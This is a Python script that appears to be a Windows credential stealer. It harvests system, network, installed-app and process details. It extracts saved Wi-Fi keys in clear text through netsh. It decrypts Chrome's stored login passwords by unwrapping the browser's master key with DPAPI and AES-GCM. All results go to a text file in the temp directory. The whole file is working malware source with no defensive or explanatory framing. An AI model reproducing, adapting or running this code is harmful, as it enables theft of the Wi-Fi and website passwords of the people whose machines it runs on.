import psutil
import wmi
import winapps
import os
import uuid
import socket   
import subprocess
import platform
from datetime import datetime
from getpass4 import getpass
from requests import get
import socket 
from getmac import get_mac_address as gma
import os
import json
import base64
import win32crypt
import tempfile
import shutil
import random
import string
import sqlite3
from Crypto.Cipher import AES
tempfileinfo=tempfile.gettempdir()
f = open(os.path.join(tempfileinfo,"7_Strong.txt"), "a")
f.write("-------- System Information --------\n")
f.write(f"Device Name : {platform.uname().node}")
f.write(f"\nInstalled OS : {platform.uname().system}")
f.write(f"\nVersion : {platform.uname().version}")
f.write("\n-------- CPU Information --------")
f.write(f"\nProcessor : {platform.uname().processor}")
f.write("\n-------- Memory Information --------")
f.write(f'\nTotal: {psutil.virtual_memory().total / (1024.0 ** 3):.2f} GB')
f.write(f'\nAvailable: {psutil.virtual_memory().available / (1024.0 ** 3):.2f} GB')
f.write(f'\nUsed: {psutil.virtual_memory().used / (1024.0 ** 3):.2f} GB')
f.write("\n-------- Disk Information --------")
obj_Disk = psutil.disk_usage('/')
f.write(f"\nTotal : {obj_Disk.total / (1024.0 ** 3):.0f}")
f.write(f"\nAvailable: {obj_Disk.free / (1024.0 ** 3):.0f}\n")
f.write(f"\nUsed : {obj_Disk.used / (1024.0 ** 3):.0f}")
try:     
    for partition in psutil.disk_partitions():
        f.write(f"Partition: {partition.mountpoint}\n")
except:
    print("")
f.write("-------- Network Information --------\n")
ip = get('https://api.ipify.org').content.decode('utf8')
f.write(f'Public IP : {format(ip)}')
IPAddr=socket.gethostbyname(platform.uname().node) 
f.write(f'\nLocal IP : {IPAddr}')
f.write(f'\nMAC : {gma()}') 
f.write("\n-------- Boot Time Information --------\n")
bt = datetime.fromtimestamp(psutil.boot_time())
f.write(f"Boot Time: {bt}")
f.write("\n-------- Installed Apps Information --------\n")
for app in winapps.list_installed():
    contents=str(app.name)
    f.write(f'Name : {contents}')
    f.write("\n")
f.write("\n-------- Running Processes Information --------\n")
cl = wmi.WMI()
for process in cl.Win32_Process():
    f.write(f"Name : {process.Name}\n")
try:
    f.write("\n-------- Passwords --------\n")
    f.write("\n-------- Getting Wifi Passwords --------\n")
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            f.write("{:<30}|  {:<}".format(i, results[0]))
            f.write("\n")
        except IndexError:
            f.write("{:<30}|  {:<}".format(i, ""))
            f.write("\n")
except:
    print("")

f.write("\n-------- Getting Browser Login Passwords --------\n")
user_Data =[os.path.join(os.environ.get('USERPROFILE'),'AppData\\Local')+r'\Google\Chrome\User Data']
def databases():
    profiles={"Default"}
    key=None
    databases=set()
    for p in user_Data:
        local_State=os.path.join(p,'Local State')
        for dirictory in os.listdir(p):
            if os.path.isdir(os.path.join(p,dirictory)) and dirictory.startswith('Profile'):
                profiles.add(dirictory)
        with open (local_State) as f:
            try:
                data=json.load(f)
                profiles|= data['profile']['info_cache']
            except:
                pass
        with open (local_State) as f:
            try:
                data=json.load(f)
                key=data['os_crypt']['encrypted_key']
                key=base64.b64decode(key)
                key=key[5:]
                key=win32crypt.CryptUnprotectData(key,None,None,None,0)[1]
            except:
                key=None
        for profile in profiles:
            all_File_In_Profiles= os.listdir(os.path.join(p,profile))
            for db in all_File_In_Profiles:
                if db =='Login Data':
                    databases.add((os.path.join(p,profile,db),key))
    return databases
databases()
def copy_DB(db_path):
    dirs=[tempfile.gettempdir(),os.environ.get('PUBLIC',None),os.environ.get('SystemDrive',None)+'\\']
    random_name= "".join([random.choice(string.ascii_lowercase) for i in range(10)])
    try:
        for r in dirs:
            temp_path=os.path.join(r,random_name)
            shutil.copy(db_path,temp_path)
            return temp_path
    except Exception:
        pass
def export_Creditional(db_path,key=None):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_v80(encrypted_password, key)
            f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
    except Exception as e:
        pass

    cursor.close()
    conn.close()
def decrypt_v80(password,key):
    try:
        iv = password[3:15]
        payload=password[15:]
        cipher =AES.new(key,AES.MODE_GCM,iv)
        decrypt_password=cipher.decrypt(payload)
        decrypt_password=decrypt_password[:-16].decode()
        return decrypt_password
    except Exception as e:
        print(e)
 
def run():
    for db_path,key in databases():
       copied_db= copy_DB(db_path)
       if copied_db:
        try:
          export_Creditional(copied_db,key)
        except Exception as e:
            print(e) 
        try:
            os.remove(copied_db)
        except Exception as e:
            print(e)
x=run()
print(x)
f.close()